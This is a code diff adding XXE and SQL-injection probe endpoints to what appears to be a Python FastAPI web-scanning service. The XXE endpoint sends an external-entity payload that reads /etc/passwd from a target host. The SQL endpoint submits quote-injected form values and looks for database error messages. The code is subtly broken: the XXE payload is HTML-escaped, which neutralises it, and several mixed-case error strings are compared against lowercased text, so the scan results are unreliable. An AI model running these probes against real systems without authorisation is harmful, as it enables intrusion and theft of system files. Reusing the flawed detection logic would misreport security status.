@@ -17,6 +17,8 @@ from urllib.parse import urljoin
 from supabase import create_client, Client
 import os
 import re
+from defusedxml import ElementTree as ET
+import html
 from typing import Optional
 wd=""
 API_URL = 'https://mohcxviiclxxhwbvdzog.supabase.co'
@@ -612,5 +614,93 @@ async def cvelookup(api_key: Optional[str] = Header(None, alias="X-API-KEY")):
     except Exception as e:
         print("check spelling bro", e)
     return(resdict)
+@app.get('/xxelookup')
+def xxelookup():
+    xxedict = {}
+    url = 'https://'+wd
+    xml_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    xml_payload = html.escape(xml_payload)
+
+    headers = {
+        'Content-Type': 'application/xml',
+    }
+
+    response = requests.post(url, headers=headers, data=xml_payload)
+
+    if response.status_code == 200:
+        try:
+            root = ET.fromstring(response.text)
+            # Check for XXE vulnerability by looking for contents of /etc/passwd in the response
+            if 'root:x' in response.text:
+                xxedict.update({"XXEStatus": "XXE vulnerability found"})
+            else:
+                xxedict.update({"XXEStatus": "No XXE vulnerability found"})
+        except ET.ParseError:
+            xxedict.update({"XXEStatus": "Invalid XML response"})
+
+    else:
+        xxedict.update({"XXEStatus": response.status_code})
+    return(xxedict)
+
+@app.get("/sqlinjection")
+def getsqli():
+    s = requests.Session()
+    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+    sqlidict={}
+    urlToBeChecked = "https://"+wd
+
+    # Get all forms on a webpage
+    soup = BeautifulSoup(s.get(urlToBeChecked).content, "html.parser")
+    forms = soup.find_all("form")
+    sqlidict.update({"NumberOfFormsDetected":len(forms)})
+    sqlidict.update({"SQLIStatus":"No Forms Detected"})
 
 
+    # Extract form details
+    for form in forms:
+        detailsOfForm = {}
+        action = form.attrs.get("action")
+        method = form.attrs.get("method", "get")
+        inputs = []
+
+        for input_tag in form.find_all("input"):
+            input_type = input_tag.attrs.get("type", "text")
+            input_name = input_tag.attrs.get("name")
+            input_value = input_tag.attrs.get("value", "")
+            inputs.append({
+                "type": input_type, 
+                "name": input_name,
+                "value": input_value,
+            })
+
+        detailsOfForm['action'] = action
+        detailsOfForm['method'] = method
+        detailsOfForm['inputs'] = inputs
+
+        for i in "\"'":
+            data = {}
+            for input_tag in detailsOfForm["inputs"]:
+                if input_tag["type"] == "hidden" or input_tag["value"]:
+                    data[input_tag['name']] = input_tag["value"] + i
+                elif input_tag["type"] != "submit":
+                    data[input_tag['name']] = f"test{i}"
+
+            #print(urlToBeChecked)
+        # print(detailsOfForm)
+
+            if detailsOfForm["method"] == "post":
+                res = s.post(urlToBeChecked, data=data)
+            elif detailsOfForm["method"] == "get":
+                res = s.get(urlToBeChecked, params=data)
+            if "quoted string not properly terminated" in res.content.decode().lower() or \
+                "unclosed quotation mark after the charachter string" in res.content.decode().lower() or \
+                'Error Occured While Processing Request' in res.content.decode().lower() or  'You have an error in your SQL syntax' in res.content.decode().lower() or  'error in your SQL syntax' in res.content.decode().lower() or  'Microsoft OLE DB Provider for ODBC Drivers Error' in res.content.decode().lower() or\
+                "you have an error in you SQL syntax" in res.content.decode().lower():
+                print("SQL injection attack vulnerability in link:", urlToBeChecked)
+                sqlidict.update({"SQLIStatus":"SQLI Detected"})
+            else:
+                sqlidict.update({"SQLIStatus":"SQLI Not Detected"})
+            
+                break
+
+    return (sqlidict)
